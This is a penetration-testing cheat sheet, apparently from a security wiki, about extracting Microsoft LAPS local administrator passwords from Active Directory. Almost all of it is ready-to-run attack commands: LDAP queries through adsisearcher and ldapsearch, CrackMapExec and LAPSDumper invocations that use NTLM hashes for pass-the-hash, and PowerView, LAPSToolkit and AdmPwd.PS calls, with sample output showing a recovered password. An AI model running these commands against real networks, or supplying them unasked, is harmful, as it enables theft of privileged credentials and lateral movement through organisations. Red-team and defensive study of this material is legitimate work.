# LAPS Passwords

{% hint style="info" %}
Use LAPS to automatically manage local administrator passwords on domain joined computers so that passwords are unique on each managed computer, randomly generated, and securely stored in Active Directory infrastructure.
{% endhint %}

## **Determine if LAPS is installed**

```
Get-ChildItem 'c:\program files\LAPS\CSE\Admpwd.dll'
Get-FileHash 'c:\program files\LAPS\CSE\Admpwd.dll'
Get-AuthenticodeSignature 'c:\program files\LAPS\CSE\Admpwd.dll'
```

## **Extract LAPS password**

{% hint style="info" %}
The "ms-mcs-AdmPwd" a "confidential" computer attribute that stores the clear-text LAPS password. Confidential attributes can only be viewed by Domain Admins by default, and unlike other attributes, is not accessible by Authenticated Users
{% endhint %}

### adsisearcher (native binary on Windows 8+)

```
([adsisearcher]"(&(objectCategory=computer)(ms-MCS-AdmPwd=*)(sAMAccountName=*))").findAll() | ForEach-Object { $_.properties}
([adsisearcher]"(&(objectCategory=computer)(ms-MCS-AdmPwd=*)(sAMAccountName=MACHINE$))").findAll() | ForEach-Object { $_.properties}
```

### CrackMapExec

```
crackmapexec smb 10.10.10.10 -u user -H 8846f7eaee8fb117ad06bdd830b7586c -M laps
```

### Powerview

```
PS > Import-Module .\PowerView.ps1
PS > Get-DomainComputer COMPUTER -Properties ms-mcs-AdmPwd,ComputerName,ms-mcs-AdmPwdExpirationTime
```

### LAPSToolkit

#### [https://github.com/leoloobeek/LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit)

```
$ Get-LAPSComputers
ComputerName                Password                                 Expiration         
------------                --------                                 ----------         
exmaple.domain.local        dbZu7;vGaI)Y6w1L                         02/21/2021 22:29:18

$ Find-LAPSDelegatedGroups
$ Find-AdmPwdExtendedRights
```

### ldapsearch

```
ldapsearch -x -h  -D "@" -w  -b "dc=<>,dc=<>,dc=<>" "(&(objectCategory=computer)(ms-MCS-AdmPwd=*))" ms-MCS-AdmPwd`
```

### LAPSDumper

[**https://github.com/n00py/LAPSDumper**](https://github.com/n00py/LAPSDumper)

```
python laps.py -u user -p password -d domain.local
python laps.py -u user -p e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c -d domain.local -l dc01.domain.local
```

### Powershell AdmPwd.PS

```
foreach ($objResult in $colResults){$objComputer = $objResult.Properties; $objComputer.name|where {$objcomputer.name -ne $env:computername}|%{foreach-object {Get-AdmPwdPassword -ComputerName $_}}}
```
